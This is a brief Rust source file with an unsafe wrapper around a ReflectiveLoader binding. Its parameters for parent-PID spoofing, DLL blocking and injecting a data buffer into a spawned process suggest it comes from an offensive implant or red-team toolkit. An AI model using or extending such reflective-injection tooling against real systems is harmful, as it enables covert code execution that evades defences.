use crate::kit::binding::ReflectiveLoader;

pub unsafe fn reflective_loader(
    start_commandline: *const u8,
    start_commandline_len: usize,
    reflective_loader_name: *const u8,
    reflective_loader_name_len: usize,
    data: *const u8,
    data_len: usize,
    param: *const u8,
    param_len: usize,
    ppid: u32,
    block_dll: bool,
    timeout: u32,
    is_need_output: bool,
) -> Vec<u8> {
    ReflectiveLoader(
        start_commandline,
        start_commandline_len,
        reflective_loader_name,
        reflective_loader_name_len,
        data,
        data_len,
        param,
        param_len,
        ppid,
        block_dll,
        timeout,
        is_need_output,
    )
    .into_bytes()
}
